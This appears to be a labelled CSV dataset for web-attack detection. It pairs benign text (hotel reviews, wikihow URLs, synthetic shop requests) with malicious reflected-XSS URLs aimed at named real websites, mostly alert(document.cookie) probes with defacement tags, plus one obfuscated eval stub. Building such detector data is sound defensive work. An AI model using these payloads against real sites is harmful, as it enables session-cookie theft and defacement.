Payloads,Class,decoded,executed,parser_changed
http://www.computec.de/index.cfm?menu=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious,"http://www.computec.de/index.cfm?menu=""><script>alert(1);</script>",True,True
"outstanding experience this hotel in the middle of the lax matrix of hotel offerings is truly a gem. outstanding service. terrific personel, very professional and always accomodating. ate at the bar with a client. client wanted a special pasta based on her restrictive diet. bartender communicated special need to head chef and viola, a great meal was served, and the client was impressed.stay here ...you won't be dissapointed!",Benign,"outstanding experience this hotel in the middle of the lax matrix of hotel offerings is truly a gem. outstanding service. terrific personel, very professional and always accomodating. ate at the bar with a client. client wanted a special pasta based on her restrictive diet. bartender communicated special need to head chef and viola, a great meal was served, and the client was impressed.stay here ...you won't be dissapointed!",False,False
http://www.sonmezeczanesi.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious,"http://www.sonmezeczanesi.com/forum/philboard_search.asp?searchterms=""><script>alert(document.cookie)</script><h1>www.raptr.us.tc</h1>",True,True
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=thimothy2&pwd=e3ec05d8&remember=off&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=thimothy2&pwd=e3ec05d8&remember=off&b1=entrar,False,False
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yoshiaki&pwd=0je7265r06&remember=on&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yoshiaki&pwd=0je7265r06&remember=on&b1=entrar,False,False
"function widget(config) { this.name = config.name; var self = this; if (config.channel) { require(\'raptor-pubsub\').channel(config.channel).on(\'emittestevent2\', function() { self.emittestevent2(); }); }}widget.prototype = { emittestevent1: function() { this.emit(\'testevent\', \'a\', \'b\'); }, emittestevent2: function() { this.emit(\'testevent\'); }};exports.widget = widget;'",Benign,"function widget(config) { this.name = config.name; var self = this; if (config.channel) { require(\'raptor-pubsub\').channel(config.channel).on(\'emittestevent2\', function() { self.emittestevent2(); }); }}widget.prototype = { emittestevent1: function() { this.emit(\'testevent\', \'a\', \'b\'); }, emittestevent2: function() { this.emit(\'testevent\'); }};exports.widget = widget;'",False,False
http://www.shepherdessconniebrown.com/show_photo.php?photo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.shepherdessconniebrown.com/show_photo.php?photo=""><script>alert(document.cookie)</script>",True,True
http://www.true-devils-leipzig.de/include.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.true-devils-leipzig.de/include.php?path=""><script>alert(document.cookie)</script>",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=payroll8&password=o%edda&nombre=leonelda&apellidos=mentruit+ferr%e0s&email=avram%40andropit.eg&dni=25024266j&direccion=san+francisco+javier%2c+135+&ciudad=alb%e1nchez&cp=31341&provincia=badajoz&ntc=0682066245285322&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=payroll8&password=o�da&nombre=leonelda&apellidos=mentruit ferr�s&email=avram@andropit.eg&dni=25024266j&direccion=san francisco javier, 135 &ciudad=alb�nchez&cp=31341&provincia=badajoz&ntc=0682066245285322&b1=registrar",False,False
http://jobs.orange.com/jobs/jobsearch.do;jsessionid=e691a2c1a28ebc0cf3c75009d932647b?do=search&amp;keywo<br>rd=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;sortfield=&amp;sorttype=&amp;lang=&amp;browserlan<br>g=&amp;type=,Malicious,"http://jobs.orange.com/jobs/jobsearch.do;jsessionid=e691a2c1a28ebc0cf3c75009d932647b?do=search&keyword=""><script>alert(document.cookie)</script>&sortfield=&sorttype=&lang=&browserlang=&type=",True,True
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=losses&pwd=co2reer%cda&remember=on&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=losses&pwd=co2reer�a&remember=on&b1=entrar,False,False
http://xat.com/universe.html?l=%22;%3e%3c/noscript%3e%3cscript%3ealert(%27hacksever%27);%3c/script%3<br>e,Malicious,"http://xat.com/universe.html?l="";></noscript><script>alert('hacksever');</script>",True,True
http://www.indirici.com/ara.asp?ara=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcot<br>icxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.indirici.com/ara.asp?ara=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.wikihow.com/dominate-at-call-of-duty-2&t=1396649196448&n=5993043&k=mainentity,Benign,http://www.wikihow.com/dominate-at-call-of-duty-2&t=1396649196448&n=5993043&k=mainentity,False,False
"great for space but noisy we stayed here for 6 nights at the beginning of january 07 and booked an 'apartment' with two bedrooms. there were four of us travelling - my husband, self and two grown up children. there were many positives about this hotel but some negatives as well;positivesspace for four adults is brilliant - two large bedrooms, huge living room, kitchen and bathroombreakfast of cereals, muffins, juice, tea, coffee, fruit supplied every daya tv in every room so the little time we spent there we did not need to argue about the channelsone block to subway stationpricenegativesextremely noisy in the bedrooms as the twin room suites all overlook 49th street - ours was only on 4th floor and we were awoken at 7am one day with workmen removing some scaffolding from outside the hotel. had to resort to earplugs!!! housekeeping erratic - beds not made one day and we never got the fourth cereal bowl we asked for on the first day.only ever one receptionist so sometimes the front desk was not manned.rooms were quite darkoverallwe thoroughly enjoyed our stay in new york but most of the time we were out of the hotel doing the sights. i may consider staying here again if there were 4 of us, but would also consider short let apartments. i think if there was just my husband and self i would choose a different hotel.",Benign,"great for space but noisy we stayed here for 6 nights at the beginning of january 07 and booked an 'apartment' with two bedrooms. there were four of us travelling - my husband, self and two grown up children. there were many positives about this hotel but some negatives as well;positivesspace for four adults is brilliant - two large bedrooms, huge living room, kitchen and bathroombreakfast of cereals, muffins, juice, tea, coffee, fruit supplied every daya tv in every room so the little time we spent there we did not need to argue about the channelsone block to subway stationpricenegativesextremely noisy in the bedrooms as the twin room suites all overlook 49th street - ours was only on 4th floor and we were awoken at 7am one day with workmen removing some scaffolding from outside the hotel. had to resort to earplugs!!! housekeeping erratic - beds not made one day and we never got the fourth cereal bowl we asked for on the first day.only ever one receptionist so sometimes the front desk was not manned.rooms were quite darkoverallwe thoroughly enjoyed our stay in new york but most of the time we were out of the hotel doing the sights. i may consider staying here again if there were 4 of us, but would also consider short let apartments. i think if there was just my husband and self i would choose a different hotel.",False,False
http://www.directgestion.fr/annonce-immobilier/annonces_photos_view.asp?announceid=1320274&amp;title=&lt;sc<br>ript&gt;alert(&quot;scriptorium(turkey)hackhaber.com&quot;)&lt;/script&gt;,Malicious,"http://www.directgestion.fr/annonce-immobilier/annonces_photos_view.asp?announceid=1320274&title=<script>alert(""scriptorium(turkey)hackhaber.com"")</script>",True,True
http://www.govtrack.us/congress/vote.xpd?vote=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script<br>%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.govtrack.us/congress/vote.xpd?vote='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://wiki.mhfrontier.info/up/updir.php?word=%3cscript%3ealert(0)%3c/script%3e&amp;cd=\%22sr1\%22&amp;mode=<br>search,Malicious,"http://wiki.mhfrontier.info/up/updir.php?word=<script>alert(0)</script>&cd=\""sr1\""&mode=search",True,True
"http://www.speakingtree.in/peoples.php?keyword=""/><script>alert(""xss:vijayendra"")</script>&search_type=all&x=0&y=0",Malicious,"http://www.speakingtree.in/peoples.php?keyword=""/><script>alert(""xss:vijayendra"")</script>&search_type=all&x=0&y=0",True,True
http://espresso.repubblica.it/go?page=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b%3c%2fsc<br>ript%3e,Malicious,"http://espresso.repubblica.it/go?page=""><script>alert(/xss by redtuning/);</script>",True,True
http://kr.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious,"http://kr.888.com/new888/home.htm?page=gettingstarted&lang=""><script>alert(document.cookie)</script>",True,True
"interesting i booked this hotel for the first 3 nights of a 5 night stay, as the last 2 nights were paid for at the pan pacific. i selected this hotel based on the review sbut when i arrived i was initially disappointed. the lobby looked great in the photos but was a bit",Benign,"interesting i booked this hotel for the first 3 nights of a 5 night stay, as the last 2 nights were paid for at the pan pacific. i selected this hotel based on the review sbut when i arrived i was initially disappointed. the lobby looked great in the photos but was a bit",False,False
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85&cantidad=6&b1=a%f1adir+al+carrito,Benign,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino rioja&precio=85&cantidad=6&b1=a�adir al carrito,False,False
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vern&password=cafetalista&nombre=saray&apellidos=aybar+bouffanais&email=gurchenko1%40englishiseasy.ee&dni=96618565g&direccion=casas+montoro%2c+31+7-h&ciudad=santa+maria+de+besora&cp=33810&provincia=segovia&ntc=3489719668476702&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vern&password=cafetalista&nombre=saray&apellidos=aybar bouffanais&email=gurchenko1@englishiseasy.ee&dni=96618565g&direccion=casas montoro, 31 7-h&ciudad=santa maria de besora&cp=33810&provincia=segovia&ntc=3489719668476702&b1=registrar",False,False
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yoonjung1&password=dosalbo&nombre=yoav&apellidos=larra+lebriquir&email=ramsel_benchley%40fest-tv.uz&dni=94943913m&direccion=pantano+de+barasona%2c+199+12%3fc&ciudad=castro-urdiales&cp=20300&provincia=sevilla&ntc=3575688218326742&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yoonjung1&password=dosalbo&nombre=yoav&apellidos=larra lebriquir&email=ramsel_benchley@fest-tv.uz&dni=94943913m&direccion=pantano de barasona, 199 12?c&ciudad=castro-urdiales&cp=20300&provincia=sevilla&ntc=3575688218326742&b1=registrar",False,False
entrar&login=olsen&pwd=5urgui8a&remember=on&b1=entrar,Benign,entrar&login=olsen&pwd=5urgui8a&remember=on&b1=entrar,False,False
http://www.wikihow.com/start-a-used-cassette-collection&t=1396534262397&n=1151401&k=mainentity,Benign,http://www.wikihow.com/start-a-used-cassette-collection&t=1396534262397&n=1151401&k=mainentity,False,False
http://www.artmedic.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.artmedic.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.wikihow.com/make-smoked-bbq-rub&t=1396546222482&n=1687140&k=mainentity,Benign,http://www.wikihow.com/make-smoked-bbq-rub&t=1396546222482&n=1687140&k=mainentity,False,False
http://www.divanmakina.com/shop/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.divanmakina.com/shop/default.asp?say=""><script>alert(""backdoor"")</script>",True,True
http://www.wikihow.com/dress-fashionably-in-a-party&t=1396546628154&n=1716096&k=mainentity,Benign,http://www.wikihow.com/dress-fashionably-in-a-party&t=1396546628154&n=1716096&k=mainentity,False,False
http://livesearch.msn.co.kr/(s(5xyffybmheu0il3b2vhkqqyv))/results.aspx?q=http//wwwgoogle.co.ip/%22%3<br>e%3cscript%3ealert(/st@rext/)%3c/script%3e&amp;mkt=ko-kr&amp;form=ksrch1,Malicious,"http://livesearch.msn.co.kr/(s(5xyffybmheu0il3b2vhkqqyv))/results.aspx?q=http//wwwgoogle.co.ip/""><script>alert(/st@rext/)</script>&mkt=ko-kr&form=ksrch1",True,True
http://public.nhlbi.nih.gov/newsroom/home/getpressrelease.aspx?id=2554%3e%3cscript%3ealert(1337)%3c/<br>script%3e,Malicious,http://public.nhlbi.nih.gov/newsroom/home/getpressrelease.aspx?id=2554><script>alert(1337)</script>,True,True
http://www.wikihow.com/transfer-dvd-to-iphone-3gs-using-sogsoft&t=1396533825191&n=1131545&k=mainentity,Benign,http://www.wikihow.com/transfer-dvd-to-iphone-3gs-using-sogsoft&t=1396533825191&n=1131545&k=mainentity,False,False
http://benchmail.benchmark.fr/asp/abonnement/recherche_lettre.asp?mot_clef=%22%27--%3e%2f%3e%29%3b%7<br>d%3balert%28-1%29%3b%3c%2fscript%3e%3cscript%3ealert%28'hello%20the%20rat'%29%3c%2fscript%3e&amp;or=&amp;f_v<br>alider.x=5&amp;f_valider.y=8,Malicious,"http://benchmail.benchmark.fr/asp/abonnement/recherche_lettre.asp?mot_clef=""'-->/>);};alert(-1);</script><script>alert('hello the rat')</script>&or=&f_valider.x=5&f_valider.y=8",True,True
insertar&precio=9182&b1=confirmar,Benign,insertar&precio=9182&b1=confirmar,False,False
<script> window[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]](/* code to eval() */) </script>,Malicious,<script> window[( {} [])[-~[]] (![] [])[-~-~[]] ([][ []] [])[-~-~-~[]] (!![] [])[-~[]] (!![] [])[ []]](/* code to eval() */) </script>,True,True
http://www.wikihow.com/prepare-precooked-ham&t=1396517473234&n=316095&k=mainentity,Benign,http://www.wikihow.com/prepare-precooked-ham&t=1396517473234&n=316095&k=mainentity,False,False
entrar&login=buddy0&pwd=pu12%f18&remember=off&b1=entrar,Benign,entrar&login=buddy0&pwd=pu12�8&remember=off&b1=entrar,False,False
http://sourceforge.net/top/topalltime.php?type=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;,Malicious,"http://sourceforge.net/top/topalltime.php?type=""><script>alert('trex')</script>",True,True
registro&login=valma&password=v433g3o5i6r79&nombre=hernardo&apellidos=chicon+merlo&email=matzenauer%40evelin.com.ci&dni=84125384d&direccion=c%2f+castalia+134+12%3ff&ciudad=tordellego&cp=22361&provincia=palencia&ntc=4126502266405093&b1=registrar,Benign,registro&login=valma&password=v433g3o5i6r79&nombre=hernardo&apellidos=chicon merlo&email=matzenauer@evelin.com.ci&dni=84125384d&direccion=c/ castalia 134 12?f&ciudad=tordellego&cp=22361&provincia=palencia&ntc=4126502266405093&b1=registrar,False,False
http://www.jtpappys.com/products.php?cat=7%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,"http://www.jtpappys.com/products.php?cat=7""><script>alert(document.cookie);</script>",True,True
http://www.vodafone.com.tr/kiosk/kiosk.php?smstype=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.vodafone.com.tr/kiosk/kiosk.php?smstype=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.larismanis.web.id/mod.php?mod=iklanbaris&amp;op=search&amp;query=%22%3e%3c%2fscript%3e%3cscript%3<br>ealert%28%22xss%22%29%3c%2fscript%3e%3cscript%3edocument.body.innerhtml%3d%22%3cstyle%3ebody{visibil<br>ity%3ahidden%3b+background%3ablack%3b}%3c%2fstyle%3e%3cdiv+style%3dvisibility%3avisible%3b%3e%3ccent<br>er%3e%3ch1%3e%3cfont+color%3d%27white%27%3exss+test+by+%3c%2ffont%3e%3cfont+color%3d%27red%27%3eemil<br>y.josan%3c%2ffont%3e%3cfont+color%3d%27white%27%3e!%3c%2ffont%3e%3c%2fh1%3e%3cfont+color%3d%27white%<br>27%3e%402012%3ch1%3e%3cfont+color%3d%27333333%27%3e+example+for+xss%3c%2ffont%3e%3c%2fh1%3e%3cbr%3e%<br>22%3b%3c%2fscript%3e,Malicious,"http://www.larismanis.web.id/mod.php?mod=iklanbaris&op=search&query=""></script><script>alert(""xss"")</script><script>document.body.innerhtml=""<style>body{visibility:hidden; background:black;}</style><div style=visibility:visible;><center><h1><font color='white'>xss test by </font><font color='red'>emily.josan</font><font color='white'>!</font></h1><font color='white'>@2012<h1><font color='333333'> example for xss</font></h1><br>"";</script>",True,True
http://wwf.panda.org/web_tools/index.cfm?uglobalsearch=test%27%22%3e%3c%2fttitle%3e%3cscript%3ealert<br>%281337%29%3c%2fscript%3e,Malicious,"http://wwf.panda.org/web_tools/index.cfm?uglobalsearch=test'""></ttitle><script>alert(1337)</script>",True,True
http://www.daniweb.com/search/search.php?q=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%<br>27,Malicious,"http://www.daniweb.com/search/search.php?q="">'><script>alert(123)</script>""'",True,True
http://www.wikihow.com/create-wall-mural-in-acrylic-colors&t=1396562853886&n=2576548&k=mainentity,Benign,http://www.wikihow.com/create-wall-mural-in-acrylic-colors&t=1396562853886&n=2576548&k=mainentity,False,False
http://lib.cet.ac.il/pages/sub.asp?item=246}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source)<br>);%3c/script%3e,Malicious,http://lib.cet.ac.il/pages/sub.asp?item=246}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.nvo.com/ecnewletter/pages/common/sitesearch.nhtml?query=%22%3e%3cscript%3ejavascript%3aal<br>ert%28%27xss%27%29%3c%2fscript%3e,Malicious,"http://www.nvo.com/ecnewletter/pages/common/sitesearch.nhtml?query=""><script>javascript:alert('xss')</script>",True,True
http://cbsncis.wetpaint.com/account/%3e%3cscript%3ealert(%22xss%20by%20azat%22)%3c%2fscript%3e,Malicious,"http://cbsncis.wetpaint.com/account/><script>alert(""xss by azat"")</script>",True,True
"great place to stay fantastic hotel! i cané¥?? say enough about how much we enjoyed our stay at this hotel. the rooms were clean and up to date. we loved the view and the 42é¥?hdtv. the staff was very friendly and extremely helpful. the location is great. you are close to so many things in la. we spent 4 days in la on a family vacation and were centrally located to any attraction that we wished to visit. fortunately, this eliminated a great deal of traffic concerns. the hotel made sure that our room was located on a non-business floor as to not distract the many business travelers. this hotel delivers everything that you expect for what you pay.",Benign,"great place to stay fantastic hotel! i cané¥?? say enough about how much we enjoyed our stay at this hotel. the rooms were clean and up to date. we loved the view and the 42é¥?hdtv. the staff was very friendly and extremely helpful. the location is great. you are close to so many things in la. we spent 4 days in la on a family vacation and were centrally located to any attraction that we wished to visit. fortunately, this eliminated a great deal of traffic concerns. the hotel made sure that our room was located on a non-business floor as to not distract the many business travelers. this hotel delivers everything that you expect for what you pay.",False,False
"great for kids and families i highly recommend this property for families. we stayed in a 2 bedroom casita and were very plesed with the decision. the beds are extremely comfortable. the decor in our casita was a bit dated but, clean and well maintained. the coyote kids club is probably the best kids club we have experienced. on the negative side of things certain areas near pools can be noisy. hotel doesn't seem to do much reduce noise.this is not a hotel for couples.... it's a family destination, great for kids!",Benign,"great for kids and families i highly recommend this property for families. we stayed in a 2 bedroom casita and were very plesed with the decision. the beds are extremely comfortable. the decor in our casita was a bit dated but, clean and well maintained. the coyote kids club is probably the best kids club we have experienced. on the negative side of things certain areas near pools can be noisy. hotel doesn't seem to do much reduce noise.this is not a hotel for couples.... it's a family destination, great for kids!",False,False
http://www.chfhq.org/section/_search/?search_query=%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e&amp;x<br>=9&amp;y=8,Malicious,"http://www.chfhq.org/section/_search/?search_query=<script>alert(""xss"")</script>&x=9&y=8",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kasbia7&password=v1jar&nombre=fiorella&apellidos=miralles+casola&email=donell%40caspospas.bh&dni=84634236d&direccion=jorge+manrique%2c+113%2c+12%3fg&ciudad=arbeteta&cp=46611&provincia=c%e1ceres&ntc=1272948221132397&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kasbia7&password=v1jar&nombre=fiorella&apellidos=miralles casola&email=donell@caspospas.bh&dni=84634236d&direccion=jorge manrique, 113, 12?g&ciudad=arbeteta&cp=46611&provincia=c�ceres&ntc=1272948221132397&b1=registrar",False,False
insertar&precio=4014&b1=pasar+por+caja,Benign,insertar&precio=4014&b1=pasar por caja,False,False
http://www.clubsaturday.nl/igallery33/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.clubsaturday.nl/igallery33/folderview.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://thedragonsgold.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://thedragonsgold.com/members/login.php?path=""><script>alert(document.cookie);</script>",True,True
http://www.wikihow.com/approach-teen-pageants&t=1396564312602&n=2661498&k=mainentity,Benign,http://www.wikihow.com/approach-teen-pageants&t=1396564312602&n=2661498&k=mainentity,False,False
"can't see what the problems are here??? i stayed at the millenuim biltmore in september, from the 4th until the 8th, and thoroughly enjoyed my stay.the lobbies and public areas are just beautiful, i felt like i was in old-world hollywood!my room was a great size - not at all small, we had two double beds and plenty of room to relax and spread out.the bathroom was more than adequate - large,even, and although was starting to show its age it was on the whole well maintained and clean.i found the staff to be pleasant and helpful, providing us with directions, and advice, and the valet staff were excellent.many complain about the price of parking - welcome to big city holidays! coming from sydney, australia - these prices are par for the course..as far as location went, for us it was great, easy to get to all the major attractions by car, and the train was two blocks away.",Benign,"can't see what the problems are here??? i stayed at the millenuim biltmore in september, from the 4th until the 8th, and thoroughly enjoyed my stay.the lobbies and public areas are just beautiful, i felt like i was in old-world hollywood!my room was a great size - not at all small, we had two double beds and plenty of room to relax and spread out.the bathroom was more than adequate - large,even, and although was starting to show its age it was on the whole well maintained and clean.i found the staff to be pleasant and helpful, providing us with directions, and advice, and the valet staff were excellent.many complain about the price of parking - welcome to big city holidays! coming from sydney, australia - these prices are par for the course..as far as location went, for us it was great, easy to get to all the major attractions by car, and the train was two blocks away.",False,False
